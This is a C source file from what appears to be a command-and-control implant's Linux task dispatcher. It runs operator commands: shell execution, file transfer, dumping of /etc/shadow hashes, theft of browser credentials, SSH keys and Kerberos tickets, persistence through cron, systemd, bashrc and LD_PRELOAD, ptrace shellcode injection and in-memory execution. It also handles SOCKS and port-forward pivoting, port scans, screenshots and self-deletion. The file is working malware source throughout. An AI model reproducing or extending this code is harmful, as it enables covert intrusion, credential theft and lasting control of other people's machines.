/**
 * Linux task dispatcher
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <errno.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"
#include "../../include/postex.h"
#include "../../include/process.h"
#include "../../include/pivot.h"
#include "../../include/json.h"
#include "../../include/fs.h"
#include "../../include/base64.h"

POUTPUT_BUFFER output_new(DWORD initial_capacity) {
    POUTPUT_BUFFER buf = (POUTPUT_BUFFER)calloc(1, sizeof(OUTPUT_BUFFER));
    if (!buf) return NULL;
    buf->data = (BYTE *)calloc(1, initial_capacity);
    if (!buf->data) {
        free(buf);
        return NULL;
    }
    buf->capacity = initial_capacity;
    return buf;
}

BOOL output_write(POUTPUT_BUFFER buf, const BYTE *data, DWORD size) {
    if (!buf || !data) return FALSE;
    while (buf->size + size > buf->capacity) {
        DWORD new_cap = buf->capacity * 2;
        if (new_cap > MAX_OUTPUT_SIZE) return FALSE;
        BYTE *nd = (BYTE *)realloc(buf->data, new_cap);
        if (!nd) return FALSE;
        buf->data = nd;
        buf->capacity = new_cap;
    }
    memcpy(buf->data + buf->size, data, size);
    buf->size += size;
    return TRUE;
}

BOOL output_printf(POUTPUT_BUFFER buf, const char *fmt, ...) {
    char tmp[4096];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (len <= 0) return FALSE;
    return output_write(buf, (BYTE *)tmp, (DWORD)len);
}

void output_free(POUTPUT_BUFFER buf) {
    if (!buf) return;
    free(buf->data);
    free(buf);
}

static void result_from_output(POUTPUT_BUFFER out, PC2_RESULT result) {
    if (out && out->size > 0) {
        result->data = out->data;
        result->data_size = out->size;
        out->data = NULL;
    }
    free(out);
}

static char *null_term_data(BYTE *data, DWORD size) {
    char *s = (char *)malloc(size + 1);
    if (!s) return NULL;
    memcpy(s, data, size);
    s[size] = '\0';
    return s;
}

static BOOL task_shell_exec(BYTE *data, DWORD size, PC2_RESULT result) {
    char *cmd = null_term_data(data, size);
    if (!cmd) return FALSE;

    FILE *fp = popen(cmd, "r");
    free(cmd);
    if (!fp) {
        snprintf(result->error, sizeof(result->error), "popen failed");
        return FALSE;
    }

    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);
    char line[4096];
    while (fgets(line, sizeof(line), fp)) {
        output_write(out, (BYTE *)line, (DWORD)strlen(line));
    }
    pclose(fp);
    result_from_output(out, result);
    return TRUE;
}

static BOOL task_ls(BYTE *data, DWORD size, PC2_RESULT result) {
    char path[MAX_PATH_LEN] = ".";
    if (data && size > 0) {
        char *p = null_term_data(data, size);
        if (p && p[0]) strncpy(path, p, sizeof(path) - 1);
        free(p);
    }

    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;

    if (fs_list_dir(path, buf, MAX_OUTPUT_SIZE) != 0) {
        free(buf);
        snprintf(result->error, sizeof(result->error), "opendir failed");
        return FALSE;
    }

    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_cd(BYTE *data, DWORD size, PC2_RESULT result) {
    char *path = null_term_data(data, size);
    if (!path) return FALSE;
    if (chdir(path) != 0) {
        snprintf(result->error, sizeof(result->error), "chdir failed");
        free(path);
        return FALSE;
    }
    free(path);
    char cwd[MAX_PATH_LEN];
    getcwd(cwd, sizeof(cwd));
    result->data = (BYTE *)strdup(cwd);
    result->data_size = (DWORD)strlen(cwd);
    return TRUE;
}

static BOOL task_pwd(PC2_RESULT result) {
    char cwd[MAX_PATH_LEN];
    if (!getcwd(cwd, sizeof(cwd))) {
        snprintf(result->error, sizeof(result->error), "getcwd failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup(cwd);
    result->data_size = (DWORD)strlen(cwd);
    return TRUE;
}

static BOOL task_cat(BYTE *data, DWORD size, PC2_RESULT result) {
    char *path = null_term_data(data, size);
    if (!path) return FALSE;

    char *content = NULL;
    size_t content_len = 0;
    if (fs_read_file(path, &content, &content_len) != 0) {
        free(path);
        snprintf(result->error, sizeof(result->error), "open failed");
        return FALSE;
    }
    free(path);

    if (content_len > MAX_OUTPUT_SIZE) {
        free(content);
        snprintf(result->error, sizeof(result->error), "file too large");
        return FALSE;
    }

    result->data = (BYTE *)content;
    result->data_size = (DWORD)content_len;
    return TRUE;
}

static BOOL task_rm(BYTE *data, DWORD size, PC2_RESULT result) {
    char *path = null_term_data(data, size);
    if (!path) return FALSE;
    if (fs_delete_file(path) != 0) {
        snprintf(result->error, sizeof(result->error), "unlink failed");
        free(path);
        return FALSE;
    }
    free(path);
    result->data = (BYTE *)strdup("ok");
    result->data_size = 2;
    return TRUE;
}

static BOOL task_mkdir(BYTE *data, DWORD size, PC2_RESULT result) {
    char *path = null_term_data(data, size);
    if (!path) return FALSE;
    if (fs_mkdir_recursive(path, 0755) != 0) {
        snprintf(result->error, sizeof(result->error), "mkdir failed");
        free(path);
        return FALSE;
    }
    free(path);
    result->data = (BYTE *)strdup("ok");
    result->data_size = 2;
    return TRUE;
}

static BOOL parse_src_dst(BYTE *data, DWORD size, char *src, size_t src_sz,
                          char *dst, size_t dst_sz) {
    if (!data || size == 0) return FALSE;

    char payload[1024];
    size_t copy_len = size;
    if (copy_len >= sizeof(payload)) copy_len = sizeof(payload) - 1;
    memcpy(payload, data, copy_len);
    payload[copy_len] = '\0';

    json_find_string(payload, "src", src, (DWORD)src_sz);
    json_find_string(payload, "dst", dst, (DWORD)dst_sz);
    if (src[0] && dst[0]) return TRUE;

    char *sep = strchr(payload, '|');
    if (sep) {
        *sep = '\0';
        strncpy(src, payload, src_sz - 1);
        src[src_sz - 1] = '\0';
        strncpy(dst, sep + 1, dst_sz - 1);
        dst[dst_sz - 1] = '\0';
        return src[0] && dst[0];
    }

    return FALSE;
}

static BOOL task_cp(BYTE *data, DWORD size, PC2_RESULT result) {
    char src[MAX_PATH_LEN] = {0};
    char dst[MAX_PATH_LEN] = {0};
    if (!parse_src_dst(data, size, src, sizeof(src), dst, sizeof(dst))) {
        snprintf(result->error, sizeof(result->error), "missing src/dst");
        return FALSE;
    }
    if (fs_copy_file(src, dst) != 0) {
        snprintf(result->error, sizeof(result->error), "copy failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup("ok");
    result->data_size = 2;
    return TRUE;
}

static BOOL task_mv(BYTE *data, DWORD size, PC2_RESULT result) {
    char src[MAX_PATH_LEN] = {0};
    char dst[MAX_PATH_LEN] = {0};
    if (!parse_src_dst(data, size, src, sizeof(src), dst, sizeof(dst))) {
        snprintf(result->error, sizeof(result->error), "missing src/dst");
        return FALSE;
    }
    if (fs_move_file(src, dst) != 0) {
        snprintf(result->error, sizeof(result->error), "move failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup("ok");
    result->data_size = 2;
    return TRUE;
}

static BOOL task_ps(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;

    if (proc_ps(buf, MAX_OUTPUT_SIZE) != 0) {
        if (disc_processes(buf, MAX_OUTPUT_SIZE) != 0) {
            FILE *fp = popen("ps aux 2>/dev/null", "r");
            if (fp) {
                char line[512];
                size_t off = 0;
                while (fgets(line, sizeof(line), fp) && off < MAX_OUTPUT_SIZE - 512) {
                    off += strlen(line);
                    strncat(buf, line, MAX_OUTPUT_SIZE - off - 1);
                }
                pclose(fp);
            }
        }
    }

    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_kill(BYTE *data, DWORD size, PC2_RESULT result) {
    int pid = 0;
    if (size == 4) {
        pid = *(int *)data;
    } else {
        char *s = null_term_data(data, size);
        if (!s) return FALSE;
        pid = atoi(s);
        free(s);
    }
    if (proc_kill(pid) != 0) {
        snprintf(result->error, sizeof(result->error), "kill failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup("ok");
    result->data_size = 2;
    return TRUE;
}

static BOOL task_spawn(BYTE *data, DWORD size, PC2_RESULT result) {
    char *cmd = null_term_data(data, size);
    if (!cmd) return FALSE;

    int pid = proc_spawn(cmd);
    free(cmd);
    if (pid < 0) {
        snprintf(result->error, sizeof(result->error), "spawn failed");
        return FALSE;
    }

    char msg[32];
    snprintf(msg, sizeof(msg), "pid=%d", pid);
    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_ifconfig(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;
    disc_interfaces(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_netstat(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;
    disc_connections(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_sleep_cfg(PIMPLANT_CONFIG config, BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) return TRUE;

    /* Teamserver sends 8-byte little-endian binary: interval + jitter */
    if (size >= 8) {
        uint32_t new_interval = *(uint32_t *)data;
        uint32_t new_jitter = *(uint32_t *)(data + 4);
        config->sleep_seconds = new_interval;
        config->jitter_percent = new_jitter;
        if (result) {
            char msg[64];
            snprintf(msg, sizeof(msg), "Sleep: %us, jitter: %u%%", new_interval, new_jitter);
            result->data = (BYTE *)strdup(msg);
            result->data_size = (DWORD)strlen(msg);
        }
        return TRUE;
    }

    char *json = null_term_data(data, size);
    if (!json) return FALSE;
    int interval = 0, jitter = 0;
    json_find_int(json, "interval", &interval);
    json_find_int(json, "jitter", &jitter);
    if (interval > 0) config->sleep_seconds = (DWORD)interval;
    if (jitter >= 0 && jitter <= 100) config->jitter_percent = (DWORD)jitter;
    free(json);
    return TRUE;
}

static BOOL task_hashdump(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;
    cred_shadow(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_browser_creds(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;
    size_t off = 0;
    cred_browser_linux(buf, MAX_OUTPUT_SIZE);
    off = strlen(buf);
    cred_ssh_keys(buf + off, MAX_OUTPUT_SIZE - off);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_persist(PIMPLANT_CONFIG config, BYTE *data, DWORD size, PC2_RESULT result) {
    (void)config;
    char *json = null_term_data(data, size);
    if (!json) return FALSE;

    char method[64] = {0}, name[128] = {0}, path[MAX_PATH_LEN] = {0}, cmd[512] = {0};
    json_find_string(json, "method", method, sizeof(method));
    json_find_string(json, "name", name, sizeof(name));
    json_find_string(json, "path", path, sizeof(path));
    json_find_string(json, "command", cmd, sizeof(cmd));

    int rc = -1;
    if (strcmp(method, "cron") == 0)
        rc = persist_cron(name[0] ? name : "jager", cmd[0] ? cmd : path);
    else if (strcmp(method, "systemd") == 0)
        rc = persist_systemd(name[0] ? name : "sysmon", path);
    else if (strcmp(method, "bashrc") == 0)
        rc = persist_bashrc(cmd[0] ? cmd : path);
    else if (strcmp(method, "rc.local") == 0)
        rc = persist_rc_local(cmd[0] ? cmd : path);
    else if (strcmp(method, "ld_preload") == 0)
        rc = persist_ld_preload(path);

    free(json);
    if (rc != 0) {
        snprintf(result->error, sizeof(result->error), "persistence failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup("persistence installed");
    result->data_size = (DWORD)strlen((char *)result->data);
    return TRUE;
}

static BOOL task_socks_start(BYTE *data, DWORD size, PC2_RESULT result) {
    char *json = null_term_data(data, size);
    int port = 1080;
    if (json) {
        json_find_int(json, "port", &port);
        free(json);
    }
    if (!port) port = 1080;
    if (!socks_start(port)) {
        snprintf(result->error, sizeof(result->error), "socks start failed");
        return FALSE;
    }
    char msg[64];
    snprintf(msg, sizeof(msg), "SOCKS5 on 127.0.0.1:%d", port);
    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_portfwd_add(BYTE *data, DWORD size, PC2_RESULT result) {
    char *json = null_term_data(data, size);
    if (!json) return FALSE;

    char variant[64] = {0};
    json_find_string(json, "variant", variant, sizeof(variant));
    if (strcmp(variant, "pivot_portfwd_list") == 0) {
        char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
        if (!buf) {
            free(json);
            return FALSE;
        }
        portfwd_list(buf, MAX_OUTPUT_SIZE);
        free(json);
        result->data = (BYTE *)buf;
        result->data_size = (DWORD)strlen(buf);
        return TRUE;
    }

    int local_port = 0, remote_port = 0;
    char remote_host[256] = {0};
    json_find_int(json, "local_port", &local_port);
    json_find_int(json, "remote_port", &remote_port);
    json_find_string(json, "remote_host", remote_host, sizeof(remote_host));
    free(json);

    int fwd_id = 0;
    if (!portfwd_add(local_port, remote_host, remote_port, &fwd_id)) {
        snprintf(result->error, sizeof(result->error), "portfwd failed");
        return FALSE;
    }
    char msg[64];
    snprintf(msg, sizeof(msg), "portfwd id=%d", fwd_id);
    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_portfwd_list(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf) return FALSE;
    portfwd_list(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_upload(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 4) {
        snprintf(result->error, sizeof(result->error), "upload: too small");
        return FALSE;
    }

    uint32_t path_len = *(uint32_t *)data;
    if (4 + path_len > (uint32_t)size) {
        snprintf(result->error, sizeof(result->error), "upload: bad path_len");
        return FALSE;
    }

    char path[512];
    size_t copy_len = path_len < 511 ? path_len : 511;
    memcpy(path, data + 4, copy_len);
    path[copy_len] = '\0';

    int written = fs_write_file(path, data + 4 + path_len, size - 4 - path_len);
    if (written < 0) {
        snprintf(result->error, sizeof(result->error), "upload: write failed");
        return FALSE;
    }

    char msg[128];
    snprintf(msg, sizeof(msg), "Uploaded %d bytes to %s", written, path);
    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_download(BYTE *data, DWORD size, PC2_RESULT result) {
    return task_cat(data, size, result);
}

static BOOL task_portscan(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size > 0) {
        size_t copy = size;
        if (copy >= sizeof(payload)) copy = sizeof(payload) - 1;
        memcpy(payload, data, copy);
    }

    char targets[512] = "127.0.0.1";
    char ports[256] = "80,443,22";
    json_find_string(payload, "targets", targets, sizeof(targets));
    json_find_string(payload, "ports", ports, sizeof(ports));

    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);
    if (!out) return FALSE;

    char targets_copy[512];
    char ports_copy[256];
    strncpy(targets_copy, targets, sizeof(targets_copy) - 1);
    targets_copy[sizeof(targets_copy) - 1] = '\0';
    strncpy(ports_copy, ports, sizeof(ports_copy) - 1);
    ports_copy[sizeof(ports_copy) - 1] = '\0';

    char *save_target = NULL;
    for (char *target_tok = strtok_r(targets_copy, ",", &save_target);
         target_tok; target_tok = strtok_r(NULL, ",", &save_target)) {
        char ports_iter[256];
        char *save_port = NULL;
        strncpy(ports_iter, ports_copy, sizeof(ports_iter) - 1);
        ports_iter[sizeof(ports_iter) - 1] = '\0';

        for (char *port_tok = strtok_r(ports_iter, ",", &save_port);
             port_tok; port_tok = strtok_r(NULL, ",", &save_port)) {
            int port = atoi(port_tok);
            if (port <= 0 || port > 65535)
                continue;

            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0)
                continue;

            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons((uint16_t)port);
            if (inet_pton(AF_INET, target_tok, &addr.sin_addr) != 1) {
                close(s);
                continue;
            }

            fcntl(s, F_SETFL, fcntl(s, F_GETFL, 0) | O_NONBLOCK);
            int rc = connect(s, (struct sockaddr *)&addr, sizeof(addr));
            if (rc == 0 || errno == EINPROGRESS) {
                fd_set wfds;
                struct timeval tv = {1, 0};
                FD_ZERO(&wfds);
                FD_SET(s, &wfds);
                if (select(s + 1, NULL, &wfds, NULL, &tv) > 0 && FD_ISSET(s, &wfds)) {
                    int err = 0;
                    socklen_t elen = sizeof(err);
                    if (getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &elen) == 0 && err == 0)
                        output_printf(out, "%s:%d open\n", target_tok, port);
                }
            }
            close(s);
        }
    }

    if (out->size == 0)
        output_printf(out, "no open ports found\n");

    result_from_output(out, result);
    return TRUE;
}

static BOOL task_self_delete(PIMPLANT_CONFIG config, PC2_RESULT result) {
    (void)result;

    char path[512];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len > 0) {
        path[len] = '\0';
        unlink(path);
    }

    system("crontab -l 2>/dev/null | grep -v 'implant' | crontab - 2>/dev/null");

    const char *home = getenv("HOME");
    if (!home)
        home = "/tmp";
    char unit[512];
    snprintf(unit, sizeof(unit), "%s/.config/systemd/user/%s.service", home, MASQUERADE_NAME);
    unlink(unit);

    config->running = FALSE;
    return TRUE;
}

static BOOL task_screenshot(PC2_RESULT result) {
    unsigned char *data = NULL;
    size_t data_len = 0;
    if (collect_screenshot_linux(&data, &data_len) != 0 || !data) {
        snprintf(result->error, sizeof(result->error), "screenshot failed");
        return FALSE;
    }
    result->data = data;
    result->data_size = (DWORD)data_len;
    return TRUE;
}

static BOOL task_bof(BYTE *data, DWORD size, PC2_RESULT result) {
    char entry[64] = "go";
    unsigned char *mod_data = NULL;
    size_t mod_len = 0;
    BOOL mod_owned = FALSE;

    if (data && size > 0 && data[0] == '{') {
        char *json = null_term_data(data, size);
        if (!json)
            return FALSE;

        char *module_b64 = (char *)calloc(1, MAX_TASK_DATA);
        if (!module_b64) { free(json); return FALSE; }
        json_find_string(json, "module", module_b64, MAX_TASK_DATA);
        json_find_string(json, "entry", entry, sizeof(entry));
        if (entry[0] == '\0' || strcmp(entry, "go") == 0)
            json_find_string(json, "symbol", entry, sizeof(entry));
        free(json);

        if (module_b64[0]) {
            mod_data = (unsigned char *)malloc(MAX_TASK_DATA);
            if (!mod_data) { free(module_b64); return FALSE; }
            mod_owned = TRUE;
            mod_len = b64_decode(module_b64, (DWORD)strlen(module_b64),
                                 mod_data, MAX_TASK_DATA);
            free(module_b64);
            if (mod_len == 0) {
                free(mod_data);
                snprintf(result->error, sizeof(result->error), "module b64 decode failed");
                return FALSE;
            }
        } else {
            free(module_b64);
        }
    }

    if (!mod_data) {
        mod_data = data;
        mod_len = size;
    }

    char *out = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!out) {
        if (mod_owned)
            free(mod_data);
        return FALSE;
    }

    if (module_load_and_run(mod_data, mod_len, entry, out, MAX_OUTPUT_SIZE) != 0) {
        snprintf(result->error, sizeof(result->error), "%s", out[0] ? out : "module load failed");
        free(out);
        if (mod_owned)
            free(mod_data);
        return FALSE;
    }

    if (mod_owned)
        free(mod_data);

    result->data = (BYTE *)out;
    result->data_size = (DWORD)strlen(out);
    return TRUE;
}

static BOOL task_p2p_listen(BYTE *data, DWORD size, PC2_RESULT result) {
    char *json = null_term_data(data, size);
    char sock_path[108] = {0};
    int port = 0;
    if (json) {
        json_find_string(json, "pipe_name", sock_path, sizeof(sock_path));
        json_find_string(json, "socket_path", sock_path, sizeof(sock_path));
        json_find_int(json, "port", &port);
        free(json);
    }

    char msg[256];
    if (port > 0) {
        if (!tcp_pivot_listen(port)) {
            snprintf(result->error, sizeof(result->error), "tcp pivot listen failed");
            return FALSE;
        }
        snprintf(msg, sizeof(msg), "P2P TCP listener on port %d", port);
    } else {
        if (!p2p_listen(sock_path[0] ? sock_path : NULL)) {
            snprintf(result->error, sizeof(result->error), "unix p2p listen failed");
            return FALSE;
        }
        snprintf(msg, sizeof(msg), "P2P unix listener: %s",
                 sock_path[0] ? sock_path : "/tmp/jager-p2p.sock");
    }

    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_p2p_connect(BYTE *data, DWORD size, PC2_RESULT result) {
    char *json = null_term_data(data, size);
    if (!json)
        return FALSE;

    char target[256] = {0};
    char sock_path[108] = {0};
    int port = 0;
    json_find_string(json, "target", target, sizeof(target));
    json_find_string(json, "pipe_name", sock_path, sizeof(sock_path));
    json_find_int(json, "port", &port);
    free(json);

    char msg[256];
    if (port > 0) {
        if (!target[0])
            strncpy(target, "127.0.0.1", sizeof(target) - 1);
        if (!tcp_pivot_connect(target, port)) {
            snprintf(result->error, sizeof(result->error), "tcp pivot connect failed");
            return FALSE;
        }
        snprintf(msg, sizeof(msg), "P2P TCP connected to %s:%d", target, port);
    } else {
        if (!p2p_connect(target, sock_path[0] ? sock_path : NULL)) {
            snprintf(result->error, sizeof(result->error), "unix p2p connect failed");
            return FALSE;
        }
        snprintf(msg, sizeof(msg), "P2P unix connected");
    }

    result->data = (BYTE *)strdup(msg);
    result->data_size = (DWORD)strlen(msg);
    return TRUE;
}

static BOOL task_p2p_relay(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        snprintf(result->error, sizeof(result->error), "missing relay config");
        return FALSE;
    }
    if (!p2p_relay_configure((const char *)data, size)) {
        snprintf(result->error, sizeof(result->error), "relay configure failed");
        return FALSE;
    }
    result->data = (BYTE *)strdup("P2P relay configured");
    result->data_size = (DWORD)strlen((char *)result->data);
    return TRUE;
}

static BOOL task_kerberos_tickets(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf)
        return FALSE;
    cred_kerberos_caches(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_dpapi(PC2_RESULT result) {
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf)
        return FALSE;
    cred_dpapi_linux(buf, MAX_OUTPUT_SIZE);
    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

static BOOL task_arp_scan_linux(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data;
    (void)size;
    char *buf = (char *)calloc(1, MAX_OUTPUT_SIZE);
    if (!buf)
        return FALSE;

    FILE *fp = popen("ip neigh show 2>/dev/null || cat /proc/net/arp 2>/dev/null", "r");
    if (fp) {
        char line[512];
        size_t off = 0;
        while (fgets(line, sizeof(line), fp) && off < MAX_OUTPUT_SIZE - 512) {
            off += strlen(line);
            strncat(buf, line, MAX_OUTPUT_SIZE - off - 1);
        }
        pclose(fp);
    }

    result->data = (BYTE *)buf;
    result->data_size = (DWORD)strlen(buf);
    return TRUE;
}

BOOL task_dispatch(PIMPLANT_CONFIG config, PC2_TASK task, PC2_RESULT result) {
    if (task->data_size > MAX_TASK_DATA) {
        snprintf(result->error, sizeof(result->error), "task payload too large");
        return FALSE;
    }

    switch (task->type) {
    case TASK_SLEEP:
        return task_sleep_cfg(config, task->data, task->data_size, result);
    case TASK_EXIT:
        config->running = FALSE;
        return TRUE;
    case TASK_SELF_DELETE:
        return task_self_delete(config, result);
    case TASK_SHELL:
    case TASK_EXECUTE:
        return task_shell_exec(task->data, task->data_size, result);
    case TASK_POWERSHELL:
        snprintf(result->error, sizeof(result->error), "powershell N/A on Linux");
        return FALSE;
    case TASK_LS:
        return task_ls(task->data, task->data_size, result);
    case TASK_CD:
        return task_cd(task->data, task->data_size, result);
    case TASK_PWD:
        return task_pwd(result);
    case TASK_CAT:
        return task_cat(task->data, task->data_size, result);
    case TASK_UPLOAD:
        return task_upload(task->data, task->data_size, result);
    case TASK_DOWNLOAD:
        return task_download(task->data, task->data_size, result);
    case TASK_RM:
        return task_rm(task->data, task->data_size, result);
    case TASK_MKDIR:
        return task_mkdir(task->data, task->data_size, result);
    case TASK_CP:
        return task_cp(task->data, task->data_size, result);
    case TASK_MV:
        return task_mv(task->data, task->data_size, result);
    case TASK_PS:
        return task_ps(result);
    case TASK_KILL_PROCESS:
        return task_kill(task->data, task->data_size, result);
    case TASK_SPAWN:
        return task_spawn(task->data, task->data_size, result);
    case TASK_IFCONFIG:
        return task_ifconfig(task->data, task->data_size, result);
    case TASK_NETSTAT:
        return task_netstat(task->data, task->data_size, result);
    case TASK_PORTSCAN:
        return task_portscan(task->data, task->data_size, result);
    case TASK_HASHDUMP:
        return task_hashdump(result);
    case TASK_BROWSER_CREDS:
        return task_browser_creds(result);
    case TASK_PERSIST_SERVICE:
    case TASK_PERSIST_SCHTASK:
    case TASK_PERSIST_REGISTRY:
        return task_persist(config, task->data, task->data_size, result);
    case TASK_SOCKS_START:
        return task_socks_start(task->data, task->data_size, result);
    case TASK_SOCKS_STOP:
        if (!socks_stop()) {
            snprintf(result->error, sizeof(result->error), "socks not running");
            return FALSE;
        }
        result->data = (BYTE *)strdup("stopped");
        result->data_size = 7;
        return TRUE;
    case TASK_PORTFWD_ADD:
        return task_portfwd_add(task->data, task->data_size, result);
    case TASK_PORTFWD_LIST:
        return task_portfwd_list(result);
    case TASK_PORTFWD_RM: {
        char *s = null_term_data(task->data, task->data_size);
        int id = s ? atoi(s) : 0;
        free(s);
        if (!portfwd_remove(id)) {
            snprintf(result->error, sizeof(result->error), "portfwd remove failed");
            return FALSE;
        }
        result->data = (BYTE *)strdup("removed");
        result->data_size = 7;
        return TRUE;
    }
    case TASK_INJECT: {
        int target_pid = 0;
        unsigned char *sc = task->data;
        int sc_len = (int)task->data_size;
        unsigned char *sc_buf = NULL;

        if (task->data && task->data_size > 0 && task->data[0] == '{') {
            char *json = null_term_data(task->data, task->data_size);
            if (!json) {
                snprintf(result->error, sizeof(result->error), "invalid inject payload");
                return FALSE;
            }

            char pid_str[16] = {0};
            char *sc_b64 = (char *)calloc(1, MAX_TASK_DATA);
            if (!sc_b64) { free(json); return FALSE; }
            json_find_string(json, "pid", pid_str, sizeof(pid_str));
            target_pid = atoi(pid_str);
            if (json_find_string(json, "shellcode", sc_b64, MAX_TASK_DATA)) {
                sc_buf = (unsigned char *)malloc(MAX_TASK_DATA);
                if (!sc_buf) { free(sc_b64); free(json); return FALSE; }
                sc_len = (int)b64_decode(sc_b64, (DWORD)strlen(sc_b64),
                                        sc_buf, MAX_TASK_DATA);
                sc = sc_buf;
            }
            free(sc_b64);
            free(json);
        }

        if (target_pid > 0 && sc && sc_len > 0) {
            if (ptrace_inject((pid_t)target_pid, sc, (size_t)sc_len) != 0) {
                snprintf(result->error, sizeof(result->error), "ptrace inject failed");
                free(sc_buf);
                return FALSE;
            }
            free(sc_buf);
            result->data = (BYTE *)strdup("injected");
            result->data_size = 8;
            return TRUE;
        }

        if (!sc || sc_len < 4) {
            snprintf(result->error, sizeof(result->error), "invalid inject payload");
            free(sc_buf);
            return FALSE;
        }
        char *argv[] = { MASQUERADE_NAME, NULL };
        int pid = memfd_exec(sc, (size_t)sc_len, argv);
        free(sc_buf);
        if (pid < 0) {
            snprintf(result->error, sizeof(result->error), "memfd_exec failed");
            return FALSE;
        }
        char msg[32];
        snprintf(msg, sizeof(msg), "pid=%d", pid);
        result->data = (BYTE *)strdup(msg);
        result->data_size = (DWORD)strlen(msg);
        return TRUE;
    }
    case TASK_BOF:
        return task_bof(task->data, task->data_size, result);
    case TASK_SCREENSHOT:
        return task_screenshot(result);
    case TASK_P2P_LISTEN:
        return task_p2p_listen(task->data, task->data_size, result);
    case TASK_P2P_CONNECT:
        return task_p2p_connect(task->data, task->data_size, result);
    case TASK_P2P_RELAY:
        return task_p2p_relay(task->data, task->data_size, result);
    case TASK_KERBEROS_TICKETS:
        return task_kerberos_tickets(result);
    case TASK_DPAPI:
        return task_dpapi(result);
    case TASK_ARP_SCAN:
        return task_arp_scan_linux(task->data, task->data_size, result);
    case TASK_DEFENSE_CLEAR_EVENTLOG: {
        const char *msg = "event log clearing not applicable on Linux";
        result->data = (BYTE *)strdup(msg);
        result->data_size = (DWORD)strlen(msg);
        return TRUE;
    }
    default:
        snprintf(result->error, sizeof(result->error), "unsupported task type %u", task->type);
        return FALSE;
    }
}
